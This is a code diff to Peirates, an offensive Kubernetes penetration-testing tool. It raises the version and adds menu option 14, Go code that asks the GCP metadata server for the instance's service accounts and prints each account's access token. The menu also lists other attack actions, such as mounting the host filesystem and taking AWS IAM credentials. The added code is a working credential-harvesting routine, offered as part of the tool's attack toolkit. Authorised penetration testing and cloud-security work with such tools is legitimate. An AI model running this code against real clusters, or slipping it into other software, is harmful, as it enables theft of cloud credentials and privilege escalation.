@@ -743,7 +743,7 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
 
-   Peirates v1.07 by InGuardians
+   Peirates v1.08 by InGuardians
    https://www.inguardians.com/labs/
 
 ----------------------------------------------------------------`)
@@ -819,7 +819,7 @@ Vulnerabilities and Misconfiguration Searching |
 [11] Launch a pod mounting its node's host filesystem
 [12] Request list of pods from a Kubelet [not yet implemented]
 [13] Request IAM credentials from AWS Metadata API [AWS only]
-[14] Request IAM credentials from GCP Metadata API [GCP only] [not yet implemented]
+[14] Request IAM credentials from GCP Metadata API [GCP only]
 [15] Request kube-env from AWS Metadata API [AWS only] [not yet implemented]
 [16] Request kube-env from GCP Metadata API [GCP only] [not yet implemented]
 
@@ -1020,6 +1020,47 @@ Peirates:># `)
 			body_2, err := ioutil.ReadAll(resp_2.Body)
 			println(string(body_2))
 			break
+		
+		
+		// [14] Request IAM credentials from GCP Metadata API [GCP only] [not yet implemented]
+		case "14":
+			// Create a new HTTP client that uses the correct headers
+			client := &http.Client{
+				// CheckRedirect: redirectPolicyFunc,
+			}
+			// Make a request for our service account(s)
+			req_accounts, err := http.NewRequest("GET","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
+			req_accounts.Header.Add("Metadata-Flavor", "Google")
+			resp, err := client.Do(req_accounts)
+			if err != nil {
+				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
+			}
+			defer resp.Body.Close()
+			body, err := ioutil.ReadAll(resp.Body)
+			// Parse result as one or more accounts, then construct a request asking for each account's credentials
+			lines := strings.Split(string(body), "\n")
+
+			for _, line := range lines {
+				if strings.TrimSpace(string(line)) == "" {
+					continue
+				}
+				account := strings.TrimRight(string(line),"/")
+				fmt.Printf("GCP Credentials for account %s\n",account)
+			
+				url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
+				req_token , err := http.NewRequest("GET",url,nil)
+				req_token.Header.Add("Metadata-Flavor", "Google")
+				resp_2, err := client.Do(req_token)
+				if err != nil {
+					println("Error - could not perform request ",url)
+				}
+				defer resp_2.Body.Close()
+				body_2, err := ioutil.ReadAll(resp_2.Body)
+				println(string(body_2))
+			}
+			break
+
+
 
 		case "19":
 			break
